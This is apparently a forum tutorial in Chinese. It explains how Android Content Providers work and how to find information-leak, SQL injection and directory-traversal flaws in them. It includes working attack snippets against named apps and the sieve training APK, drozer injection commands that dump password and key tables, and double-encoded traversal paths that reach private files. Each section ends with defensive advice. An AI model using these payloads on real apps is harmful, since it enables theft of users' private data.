> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-269447.htm)

> Android APP 漏洞之战（4）——Content Provider 漏洞详解

Android APP 漏洞之战（4）——Content Provider 漏洞详解
==========================================

目录

*   Android APP 漏洞之战（4）——Content Provider 漏洞详解
*            [一、前言](#一、前言)
*            二、Content Provider 初步介绍
*                    1.Content Provider 的基本原理
*                    （1）Content Provider 简介
*                    （2）Content Provider 作用
*                    [（3）URI 详解](#（3）uri详解)
*                                    URI:
*                                    MIME:
*                                    URI 解析:
*                    （4）Content Provider 数据共享
*                    （5）Content Resolver 操作数据
*                    （6）Content Provider 使用
*                    2.Content Provider 漏洞的种类和危害
*            三、Content Provider 漏洞原理分析和复现
*                    [1. 漏洞挖掘方法](#1.漏洞挖掘方法)
*                            [（1）查找导出 Provider](#（1）查找导出provider)
*                            [（2）查找 URI](#（2）查找uri)
*                            [（3）方法使用](#（3）方法使用)
*                    [2. 信息泄露漏洞](#2.信息泄露漏洞)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                            [（3）安全防护](#（3）安全防护)
*                    [3.SQL 注入漏洞](#3.sql注入漏洞)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                            [（3）安全防护](#（3）安全防护)
*                    [4. 目录遍历漏洞](#4.目录遍历漏洞)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                            [（3）安全防护](#（3）安全防护)
*            [四、实验总结](#四、实验总结)
*            [五、参考文献](#五、参考文献)

[](#一、前言)一、前言
-------------

今天总结 Android APP 四大组件中 Content Provider 挖掘的知识，主要分为两个部分，一部分是对 Android Content Provider 内容提供器的原理总结，另一部分便是对 Android provider 机制常见的一些漏洞总结，包括一些已知的漏洞方法，和一部分案例实践。

二、Content Provider 初步介绍
-----------------------

### 1.Content Provider 的基本原理

### （1）Content Provider 简介

![](https://bbs.pediy.com/upload/attach/202109/905443_THZZM38BMRHHD7P.png)

```
Android中的数据存储方式：Shared Preferences、网络存储、文件存储、外部存储、SQLite,这些存储方式一般在单独的应用程序中实现数据共享，对于不同应用之间共享数据，就要借助Content Provider。
ContentProvider为存储和读取数据提供了统一的接口，使用表的形式来对数据进行封装，使用ContentProvider可以在不同的应用程序之间共享数据，统一数据的访问方式，保证数据的安全性。

```

### （2）Content Provider 作用

![](https://bbs.pediy.com/upload/attach/202109/905443_BFM67Z7VPAXZPGA.png)

 

![](https://bbs.pediy.com/upload/attach/202109/905443_P4Y9X7NCMCPHJ76.png)

 

Content Provider 可以使得不同 APP 进程之间进行数据交互和共享，即跨进程通信

### [](#（3）uri详解)（3）URI 详解

我们创建一个 Content Provider，其他的应用可以通过使用 ContentResolver 来访问 ContentProvider 提供的数据，而 ContentResolver 通过 uri 来定位自己要访问的数据，所以我们要先了解 URI

##### URI:

**URI 的介绍：**

```
（1）定义：Uniform Resource Identifier，即统一资源标识符
（2）作用：唯一标识ContentProvider &其中的数据
（3）外界进程通过URL找到对应的ContentProvider &其中数据，再进行数据操作

```

![](https://bbs.pediy.com/upload/attach/202109/905443_92EXMEKYH5VR3J2.png)

```
（1）标准前缀:content:// ,用来说明一个Content Provider控制这些数据
（2）URL的标识：com.carson.provider, 用于唯一标识这个ContentProvider，外部调用者可以根据这个标识来找到它。对于第三方程序，为了保证URL标识的一致性，必须是一个完整的、小写的类名，这个标识在元素的authorities属性中说明，一般是定义该ContentProvider的包.类的名称
（3）路径：User,要操作的数据库中表的名字，或者可以自己定义，记得在使用的时候保持一致
（4）记录ID:id, 如果URL中包含表示需要获取的记录ID,则返回该id对应的数据，如果没有ID,就表示返回全部

```

**构建 URI 的路径：**

```
（1）操作User表中id为11的记录，构建数据：/User/11
（2）操作User表中id为11的记录的name字段：User/11/name
（3）操作User表中的所有记录：/User
（4）操作来自文件、xml或网络其他存储方式的数据，如要操作xml文件中User节点下的name字段：/User/name
（5）若要将一个字符串转换成URI,可以使用Uri类中的parse()方法：
    Uri uri = Uri.parse("content://com.carson.provider/User")；

```

**URI 各部分的获取：**

 

我们给出一个 URI 的样例：

```
http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&name=jack

```

我们介意使用一些方法来获取 URI 的各个部分：

```
getScheme()：获取 Uri 中的 scheme 字符串部分，在这里是 http
getHost()：获取 Authority 中的 Host 字符串，即 www.baidu.com
getPost()：获取 Authority 中的 Port 字符串，即 8080
getPath()：获取 Uri 中 path 部分，即 wenku/jiatiao.html
getQuery()：获取 Uri 中的 query 部分，即 id=15&name=jack

```

##### MIME:

MIME 是指定某个扩展名的文件用一种应用程序打开，就像用浏览器查看 PDF 格式的文件，浏览器会选择合适的应用打开。ContentProvider 会根据 URI 来返回 MIME 类型，ContentProvider 会返回一个包含两部分的字符串。MIME 类型一般包含两部分，如：

```
text/html
text/css
text/xml
application/pdf

```

分为类型和子类型，Android 遵循类似的约定来定义 MIME 类型，每个内容类型的 Android MIME 类型有两种形式：多条记录（集合）和单条记录。

*   集合记录（dir）:

```
vnd.android.cursor.dir/自定义

```

*   单条记录（item）:

```
vnd.android.cursor.item/自定义

```

vnd 表示这些类型和子类型具有非标准的、供应商特定的形式。Android 中类型已经固定好了，不能更改，只能区别是集合还是单条具体记录，子类型可以按照格式自己填写，在使用 Intent 时，会用到 MIME，根据 Mimetype 打开符合条件的活动。

##### URI 解析:

这里 URI 代表要操作的数据，我们在对数据进行获取时需要解析 URI，Android 提供了两个操作 URI 的工具类：UriMatcher 和 ContentUris

 

**UriMatcher：**

 

UriMatcher 类用于匹配 Uri，使用步骤如下：

*   将需要匹配的 Uri 路径进行注册：

```
//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码
UriMatcher  sMatcher = new UriMatcher(UriMatcher.NO_MATCH);
//如果match()方法匹配“content://com.wang.provider.myprovider/tablename”路径，返回匹配码为1
sMatcher.addURI("content://com.wang.provider.myprovider", " tablename ", 1);
//如果match()方法匹配content://com.wang.provider.myprovider/tablename/11路径，返回匹配码为2
sMatcher.addURI("com.wang.provider.myprovider", "tablename/#", 2);

```

此处采用 addURI 注册了两个需要用到的 URI；注意，添加第二个 URI 时，路径后面的 id 采用了通配符形式 “#”，表示只要前面三个部分都匹配上了就 OK

 

补充：

```
*:表示匹配任意长度的任意字符
#:表示匹配任意长度的数字
匹配任意表的内容URI格式：
content：//com.example.app.provider/*
匹配table表中1任意一行数据的内容URI格式：
content：//com.example.app.procider/table/#

```

*   注册完需要匹配的 Uri 后，可以使用 sMatcher.match(Uri) 方法对输入的 Uri 进行匹配，如果匹配就返回对应的匹配码，匹配码为调用 addURI() 方法时传入的第三个参数

```
switch (sMatcher.match(Uri.parse("content://com.zhang.provider.yourprovider/tablename/100"))) {
    case 1:
      //match 1, todo something
      break;
    case 2
      //match 2, todo something
      break;
    default:
      //match nothing, todo something
     break;
}

```

**ContentUris:**

 

ContentUris 类用于操作 Uri 路径后面的 ID 部分，有两个比较实用的方法：withAppendedId(Uri uri, long id) 和 parseId(Uri uri)

*   withAppendedId(Uri uri, long id) 用于为路径加上 ID 部分：

```
Uri uri = Uri.parse("content://com.wang.provider.myprovider/tablename");
//生成的Uri为：content://com.wang.provider.myprovider/tablename/10
 Uri resultUri = ContentUris.withAppendedId(uri, 10);

```

*   parseId(Uri uri) 则从路径中获取 ID 部分:

```
Uri uri = Uri.parse("content://com.zhang.provider.myprovider/tablename/10")
//获取的结果为：7
long personid = ContentUris.parseId(uri);

```

### （4）Content Provider 数据共享

ContentProvider 是一个抽象类，我们需要开发自己的内容提供者就需要继承这个类并复写其方法：

```
ContentProvider 类主要方法的介绍：
public boolean onCreate()，在ContentProvider创建后就会被调用，而ContentProvider是在其它应用第一次访问它时被创建；
public Uri insert(Uri uri, ContentValues values)，供外部应用向ContentProvider添加数据；
public int delete(Uri uri, String selection, String[] selectionArgs)，供外部应用从ContentProvider删除数据；
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs)，供外部应用更新ContentProvider中的数据；
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)，供外部应用从ContentProvider中获取数据；
public String getType(Uri uri)，返回当前Uri所代表数据的MIME类型；

```

如果操作的数据属于集合类型，那么 MIME 类型字符串应该以 vnd.android.cursor.dir/ 开头：

```
要得到所有 tablename 记录： Uri 为 content://com.wang.provider.myprovider/tablename，那么返回的MIME类型字符串应该为vnd.android.cursor.dir/table

```

如果要操作的数据属于非集合类型数据，那么 MIME 类型字符串应该以 vnd.android.cursor.item/ 开头：

```
要得到 id 为 10 的 tablename 记录，Uri 为 content://com.wang.provider.myprovider/tablename/10，那么返回的 MIME 类型字符串为：vnd.android.cursor.item/tablename

```

### （5）Content Resolver 操作数据

当外部应用需要对 ContentProvider 中的数据进行添加、删除、修改及查询操作时，可以使用 ContentResolver 类来完成，要获取 ContentResolver 对象，可以使用 Activity 提供 getContentResolver()

 

ContentResolver 类提供了与 ContentProvider 类相同签名的四个方法：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_FGR9PDYBR99BRGU.png)

```
public Uri insert(Uri uri, ContentValues values)，往ContentProvider添加数据；
 
public int delete(Uri uri, String selection, String[] selectionArgs)，从ContentProvider删除数据；
 
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs)，更新ContentProvider中的数据；
 
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)，从ContentProvider中获取数据；

```

这些方法的第一个参数为 Uri，代表要操作的 ContentProvider 和对其中的什么数据进行操作，其实和 ContentProvider 里面的方法是一样的，最终会被传到我们之前程序里面定义的 ContentProvider 方法。

```
假定给定的是：Uri.parse("content://com.wang.provider.myprovider/tablename/10")，
那么将会对主机名为com.wang.provider.myprovider的ContentProvider进行操作，操作的数据为tablename表中id为10的记录

```

使用 ContentResolver 对 ContentProvider 中的数据进行操作：

```
ContentResolver resolver = getContentResolver();
 Uri uri = Uri.parse("content://com.wang.provider.myprovider/tablename");
 //添加一条记录
 ContentValues values = new ContentValues();
 values.put("name", "wang1");
 values.put("age", 28);
 resolver.insert(uri, values);
 //获取tablename表中所有记录
 Cursor cursor = resolver.query(uri, null, null, null, "tablename data");
while(cursor.moveToNext()){
   Log.i("ContentTest", "tablename_id="+ cursor.getInt(0)+ ", name="+ cursor.getString(1));
}
//把id为1的记录的name字段值更改新为zhang1
ContentValues updateValues = new ContentValues();
updateValues.put("name", "zhang1");
Uri updateIdUri = ContentUris.withAppendedId(uri, 2);
resolver.update(updateIdUri, updateValues, null, null);
//删除id为2的记录，即字段age
Uri deleteIdUri = ContentUris.withAppendedId(uri, 2);
resolver.delete(deleteIdUri, null, null);

```

**监听数据变化：**

 

如果 ContentProvider 的访问者需要知道数据发生的变化，可以在 ContentProvider 发生数据变化时调用 getContentResolver().notifyChange(uri, null) 来通知注册在此 URI 上的访问者。只给出类中监听部分的代码：

```
public class MyProvider extends ContentProvider {
   public Uri insert(Uri uri, ContentValues values) {
     db.insert("tablename", "tablenameid", values);
      getContext().getContentResolver().notifyChange(uri, null);
   }
}

```

而访问者必须使用 ContentObserver 对数据（数据采用 uri 描述）进行监听，当监听到数据变化通知时，系统就会调用 ContentObserver 的 onChange() 方法：

```
getContentResolver().registerContentObserver(Uri.parse("content://com.ljq.providers.personprovider/person"),
        true, new PersonObserver(new Handler()));
 public class PersonObserver extends ContentObserver{
     public PersonObserver(Handler handler) {
       super(handler);
     }
     public void onChange(boolean selfChange) {
        //to do something
     }
 }

```

### （6）Content Provider 使用

![](https://bbs.pediy.com/upload/attach/202109/905443_ZG6RN43SA6TWTFN.png)

 

创建内容提供者的基本流程：

```
（1）创建一个扩展ContentProviderbaseclass的 Content Provider 类
（2）定义将用于访问内容的内容提供者 URI 地址
（3）创建自己的数据库来保存内容。通常，Android 使用 SQLite 数据库，框架需要覆盖onCreate()方法，该方法将使用 SQLite Open Helper 方法创建或打开提供者的数据库。当您的应用程序启动时，其每个内容提供程序的onCreate()处理程序在主应用程序线程上被调用
（4）实现内容提供者查询以执行不同的数据库特定操作
（5）最后使用 标签在您的活动文件中注册您的内容提供者 
```

### 2.Content Provider 漏洞的种类和危害

Content Provoder 漏洞大致可以分为：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_WHA5BS39WRBY5G3.png)

 

Content Provider 漏洞的危害：

```
Android中Content Provider起到在不同的进程APP之间实现共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。
Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作
而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞

```

三、Content Provider 漏洞原理分析和复现
----------------------------

### 1. 漏洞挖掘方法

先检测组件的 exported 属性，再检测组件 permission、readPermission、writePermissio 对应的 protectionlevel，最后再检测 sdk 版本

 

![](https://bbs.pediy.com/upload/attach/202109/905443_RY4WG2ZJZTBYSEB.png)

#### [](#（1）查找导出provider)（1）查找导出 Provider

```
（1）反编译 apk 文件，在AndroidManifest.xml中查找显示设置了android:exported="true"Content Provider
（2）使用drozer工具，执行命令：run app.provider.info -a ddns.android.vuls

```

#### [](#（2）查找uri)（2）查找 URI

*   反编译 apk 文件，在代码中查找 UriMatcher.addURI，并手动拼接 uri

![](https://bbs.pediy.com/upload/attach/202109/905443_6W34GAPGU7JFG7G.png)

 

如上，可以拼接出：

```
content://ddns.vuls.AccountProvider/account
content://ddns.vuls.AccountProvider/account/
content://ddns.vuls.AccountProvider/account/1
content://ddns.vuls.AccountProvider/account/aaa

```

*   使用 drozer 工具

```
执行命令 run app.provider.finduri ddns.android.vuls

```

#### [](#（3）方法使用)（3）方法使用

```
1.使用adb shell查询
例子：adb shell content query --uri 具体uri
2.使用drozer验证
例子：run app.provider.query "具体uri"
3.编写目标代码
例如：
private void getyouni(){
    int i = 0;
    ContentResolver contentresolver=getContentResolver();
    String[] projection={"* from contacts--"};
    Uri uri =Uri.parse("content://com.snda.youni.providers.DataStructs/message_ex");
    Cursor cursor=contentresolver.query(uri.projection,null,null,null);
    String text="";
    while(cursor.moveToNext()){
        text+=cursor.getString(cursor.getColumnIndex("display_name"))+"\n";
    }
    Log.i("TEST",text);
}

```

我们下面将结合这三种方法来对一些常见的案例进行漏洞挖掘介绍

### 2. 信息泄露漏洞

#### [](#（1）原理介绍)（1）原理介绍

```
content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个，provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。

```

#### [](#（2）漏洞复现)（2）漏洞复现

**案例 1：盛大有你 Android 存在信息泄露漏洞**

 

目标代码：

攻击代码：

```
private void getyouni(){
    int i = 0;
    ContentResolver contentresolver=getContentResolver();
    String[] projection={"* from contacts--"};
    Uri uri =Uri.parse("content://com.snda.youni.providers.DataStructs/message_ex");
    Cursor cursor=contentresolver.query(uri.projection,null,null,null);
    String text="";
    while(cursor.moveToNext()){
        text+=cursor.getString(cursor.getColumnIndex("display_name"))+"\n";
    }
    Log.i("TEST",text);
}

```

代码分析：

 

我们可以分析目标程序的 provider 的进程名和授权的的 URI，我们可以根据授权的 URI 来构建一个 URI，然后通过 contentresolver 去读取里面的的列表名信息，这样我们就可以获取 APP 中的隐私数据信息。

 

**案例 2：样例 sieve.apk**

 

我们先向 apk 中添加一条数据，然后保存：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_VXGPFGX7458H6U7.png)

 

我们先使用 drozer 对内容提供器的路径进行扫描：

```
run scanner.provider.finduris -a <包名>

```

报错：drozer could not find or compile a required extension library

 

这是由于我们 drozer2.7 中代码导致的，我们需要修改相应的代码，参考网址 (https://github.com/FSecureLABS/drozer/issues/361)

 

![](https://bbs.pediy.com/upload/attach/202109/905443_72WXQNG2AH4NGNZ.png)

 

![](https://bbs.pediy.com/upload/attach/202109/905443_AG83T36NF98JV36.png)

 

我们可以对敏感数据读取：

```
run app.provider.query uri

```

![](https://bbs.pediy.com/upload/attach/202109/905443_V79WY8BMC6YQV4Y.png)

 

我们就成功的将我们刚才保存的账号密码信息给获取了

 

案例 3：[CVE-2018-9546: Download Provider 文件头信息泄露](https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

 

漏洞描述：

```
Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。

```

目标代码：

```
读取header的URI为：content://download/mydownloads/download_id/headers

```

攻击代码：

```
Uri uri = Uri.parse("content://download/mydownloads/1493/headers");
Cursor cur = res.query(uri, null, null, null, null);
 
try {
    if (cur != null && cur.getCount() > 0) {
        StringBuilder sb = new StringBuilder(LOG_SEPARATOR);
        sb.append("HEADERS FOR DOWNLOAD ID ").append(id).append("\n");
        while (cur.moveToNext()) {
            String rowHeader = cur.getString(cur.getColumnIndex("header"));
            String rowValue = cur.getString(cur.getColumnIndex("value"));
            sb.append(rowHeader).append(": ").append(rowValue).append("\n\n");
        }
        log(sb.toString());
    }
} finally {
    if (cur != null)
        cur.close();
}

```

由于 header 的 URI 并未做一些防护措施，我们可以将 download_id 取具体的值，然后来获取里面的具体信息

#### [](#（3）安全防护)（3）安全防护

```
1.minSdkVersion不低于9
2.不向外部app提供数据的私有content provider显示设置exported=”false”，避免组件暴露(编译api小于17时更应注意此点)
3.内部app通过content provid交换数据时，设置protectionLevel=”signature”验证签名
4.公开的content provider确保不存储敏感数据
 
针对权限保护绕过防御措施：
1.使用Context.checkCallingPermission()和Context.enforceCallingPermission()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。
2.可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。

```

### 3.SQL 注入漏洞

#### [](#（1）原理介绍)（1）原理介绍

```
对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。
所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。
另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。

```

#### [](#（2）漏洞复现)（2）漏洞复现

**案例 1：[安全管家客户端存在 SQL 注入攻击](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086899)**

 

漏洞说明：

```
Android版安全管家客户端contentprovider uri配置不当，导致sql注入，使得任何应用可不需要root权限下，获得和修改数据库中数据。

```

Androidmanifest 文件中定义的 provider：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_QQYPPTH3VET8UDN.png)

 

使用 drozer 扫描客户端程序存在的 contentProvider uri:

 

![](https://bbs.pediy.com/upload/attach/202109/905443_576HVQ5VDGAY5AJ.png)

 

搜索到对外暴露可访问的 uri:

 

![](https://bbs.pediy.com/upload/attach/202109/905443_XPTEEQJ8BN3A4VT.png)

 

newapp.db 结构：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_RJYZJ474YDF527J.png)

 

查看新安装应用的包名：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_WQYUCYAE8J6EYSH.png)

 

查看白名单：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_DN6Z86UBSCGP9BE.png)

 

![](https://bbs.pediy.com/upload/attach/202109/905443_772CTM5JEPZV9BC.png)

 

**案例 2：样本 sieve**

 

我们使用 drozer 扫描注入的位置：

```
run scanner.provider.injection -a <包名>

```

![](https://bbs.pediy.com/upload/attach/202109/905443_N9SJUZPPWC5FVN4.png)

 

然后我们执行以下命令，发现返回了报错信息，接着构造 sql 获取敏感数据

```
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " * from Key;--+"

```

![](https://bbs.pediy.com/upload/attach/202109/905443_UEA2PVNM7SMW6M8.png)

 

列出所有表信息：

```
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"

```

![](https://bbs.pediy.com/upload/attach/202109/905443_ATVKAEG5HQM3GT5.png)

 

获取具体表信息

```
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"

```

![](https://bbs.pediy.com/upload/attach/202109/905443_KWQW5V7SXP52NGH.png)

 

列出该 app 的表信息

```
run scanner.provider.sqltables -a  com.mwr.example.sieve

```

![](https://bbs.pediy.com/upload/attach/202109/905443_PMANUDQ547U2CN6.png)

 

案例 3：[CVE-2018-9493: Download Provider SQL 注入](https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

 

漏洞分析：

```
Download Provider中的以下columns是不允许被外部访问的，例如CookieData，但是利用SQL注入漏洞可以绕过这个限制。
projection参数存在注入漏洞，结合二分法可以爆出某些columns字段的内容。

```

目标代码：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_VHTPUNDMAJDMFYM.png)

 

攻击代码：

 

详细可以参考该作者博客：(https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

#### [](#（3）安全防护)（3）安全防护

```
1.实现健壮的服务端校验
2.使用参数化查询语句，比如SQLiteStatement
3.避免使用rawQuery()
4.过滤用户的输入

```

### 4. 目录遍历漏洞

#### [](#（1）原理介绍)（1）原理介绍

```
Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的

```

漏洞触发的前提条件：

```
对外暴露的Content Provider组件实现了openFile()接口
没有对所访问的目标文件Uri进行有效判断，如没有过滤限制如“../”可实现任意可读文件的访问的Content Query Uri

```

#### [](#（2）漏洞复现)（2）漏洞复现

案例 1：[赶集网 Android 客户端 Content Provider 组件任意文件读取漏洞](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407)

 

漏洞分析：

```
赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported="true",对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过"../"实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据）。

```

攻击代码：

```
public void GJContentProviderFileOperations(){
    try{
        InputStream in = getContentResolver().openInputStream(Uri.parse("content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml"));
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int n = in.read(buffer);
        while(n>0){
            out.write(buffer, 0, n);
            n = in.read(buffer);
            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();
        }
    }catch(Exception e){
        debugInfo(e.getMessage());
    }
}

```

**案例 2：样本 sieve**

 

我们检测文件遍历漏洞：

```
run scanner.provider.traversal -a <包名>

```

![](https://bbs.pediy.com/upload/attach/202109/905443_9B5T695345FCUZF.png)

 

我们读取系统文件：

```
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts

```

![](https://bbs.pediy.com/upload/attach/202109/905443_PJ4KCCTEB3UEZGM.png)

 

我们下载系统文件：

```
run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db

```

![](https://bbs.pediy.com/upload/attach/202109/905443_M3GEQE8EG4QKYFC.png)

 

案例 3：

 

目标代码：

```
private static String IMAGE_DIRECTORY=localFile.getAbsolutePath();
public ParcelFileDescriptor openFile(Uri paramUri,String paramString);
throws FileNotFoundException{
    File file=new File(IMAGE_DIRECTORY,paramUri.getLastPathSegment());
    return ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);
}

```

我们可以从目标代码中分析，这段代码使用 android.net.Uri.getLastPathSegment() 从 paramUri 中获取文件名，然后将其放置在预定义好的目录 IMAGE_DIRECTORY 中，如果该 URL 是 encoded 编码后的，那么将可能导致目录遍历漏洞

 

Android4.3 开始，Uri.getLastPathSegment() 内部实现调用 Uri.getPathSegments()

```
Uri.getPathSegments()部分代码片段： 
PathSegments getPathSegments(){
    if(pathSegments!=null){
        return pathSegments;
    }
    String path = getEncoded();
    if(path==null){
        return pathSegments = PathSegments.EMPTY;
    }
    PathSegmentsBuilder segmentBuilder=new PathSegmentsBuilder();
    int previous =0;
    int current;
    while((current=path.indexOf('/',previous))>-1){
        if(previous
```

Uri.getPathSegments 首先会通过 getEncoded() 获取一个路径，然后以”/“为分隔符将 path 分成片段，最后调用 decode() 方法解码

 

假如我们传递 encoded 编码后的 url 给 getLastPathSegment()，编码后的分隔符就变成了 %2F, 绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是 API 设计方面的问题，直接导致了目录遍历漏洞

```
public String getLastPathSegment(){
    List segments=getPathSegments();
    int size=segments.size();
    if(size==0){
        return null;
    }
    return segments.get(size-1);
} 
```

为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给 getLastPathSegment() 之前解码，采用调用两次 getLastPathSegment() 方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值这一部分大家可以详细参考博客：(https://tea9.xyz/post/758430476.html)

```
private static String IMAGE_DIRECTORY=localFile.getAbsolutePath();
    public ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws FileNotFoundException{
        File file=new File(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());
        return ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);
    }
 
这个编码后的URL： ..%2F..%2F..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml  
第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。  
第二次调用getLastPathSegment()会返回Example.xml 
 
 
然而攻击者可以采用一种叫做"Double Encoding"的技术，使得第一次调用getLastPathSegment()后无法解码。
 
比如下面经过double encoded后的string就可以绕过上面这种防御
 
%252E%252E%252F%252E%252E%252F%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml
 
第一次解码后： %2E%2E%2F%2E%2E%2F%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml
 
第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml
仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径。

```

#### [](#（3）安全防护)（3）安全防护

```
1. 将不必要导出的Content Provider设置为不导出
2. 去除没有必要的openFile()接口
3. 过滤限制跨域访问，对访问的目标文件的路径进行有效判断
4. 设置权限来进行内部应用通过Content Provider的数据共享

```

[](#四、实验总结)四、实验总结
-----------------

本文对 Content Provider 内容提供器的基本原理做了一个详细讲解，然后对 Provider 常见的一些漏洞情况作了分析，这里面一部分漏洞来自于漏洞平台，一部分来自于网上的博客收集总结，还提供了一个样例 sieve.apk，初步的实现信息泄露、SQL 注入、目录遍历漏洞的基本操作方式，也介绍了一般挖掘 provider 漏洞的基本方法，其中关于 drozer 的具体操作使用，大家可以参考之前的博客：[Android 漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF](https://bbs.pediy.com/thread-269196.htm)，当然可能对于 Provider 中的漏洞介绍还不是很全面，其他的就请各位大佬指正了。

[](#五、参考文献)五、参考文献
-----------------

Content Provider 原理介绍

```
https://www.cnblogs.com/tgyf/p/4696288.html
https://www.jianshu.com/p/5e13d1fec9c9
https://www.cnblogs.com/huansky/p/13785634.html
http://www.tutorialspoint.com/android/android_content_providers.htm

```

Content Provider 漏洞挖掘

```
https://tea9.xyz/post/758430476.html
https://ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/
https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156386
http://www.feidao.site/wordpress/?p=3295
http://www.hackdig.com/03/hack-19497.htm
https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/

```

[【公告】 讲师招募 | 全新 “预付费” 模式，不想来试试吗？](https://bbs.pediy.com/thread-271621.htm)

[#基础理论](forum-161-1-117.htm) [#漏洞相关](forum-161-1-123.htm) [#程序开发](forum-161-1-124.htm) [#其他](forum-161-1-129.htm)

上传的附件：

*   [sieve.apk](javascript:void(0)) （359.26kb，6 次下载）